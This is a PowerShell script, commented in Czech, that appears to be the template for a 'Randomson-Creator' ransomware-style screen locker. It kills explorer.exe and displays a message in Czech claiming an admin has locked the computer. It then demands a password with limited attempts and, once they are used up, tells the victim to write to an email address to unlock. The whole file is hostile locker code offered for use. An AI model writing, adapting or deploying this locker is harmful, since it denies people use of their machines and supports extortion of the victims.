#This is setup script --> for Randomson-Creator
Import-Module Microsoft.PowerShell.Utility
taskkill /f /im explorer.exe
Set-Alias -Name wo -Value Write-Output
Set-Alias -Name clsH -Value Clear-Host
Set-Alias -Name clsH -Value Clear-Host
#------------------------WARNING!! (POUZE POKUD MÁTE WINDOWS 11) --------------------------------
#Pro lepší debug dej hashtag před taskkill, ničí to Windows 11 PC, když se pořád vypíná a zapíná explorer.exe
#Může to udělat problémy jako 
#wo "DEBUG:  EXPLORER.EXE KILLED!"

function start1 {
Clear-Host
wo "Admin tohoto pocitace tento pocitac zamkl."
wo "Admin musi tento pocitac odemknout, takze musis jen cekat."
wo ""
wo ""
Pause
Clear-Host
}

function next1{
    Clear-Host    
    $heslo = Read-Host "Zadejte Heslo"
    
        if ($heslo -eq $password){
            wo "Uspesne odemceni! "
            wo ""
            start explorer.exe
            wo ""
            wo ""
            Pause
            exit
        }
        elseif ($attempts -eq 0){
            wo ""
        }
        else {
            wo "Nesprávné heslo zbývá vám $attempts pokusů."
            wo ""
            Pause
        }
        
}



start1

$loop = $false

#Optional:
#wo "Máte $attempts pokusy na odemknutí počítače."


while ($loop -eq $false){
    Clear-Host
    if ($attempts -eq 0){
            wo "Všechny pokusy byly vyčerpány. Uzamknuto. Pro odemčeni napište na $email"
            wo ""
            $loop = $true
            Pause
            exit
    }
    $attempts = $attempts-1
    next1
}
Pause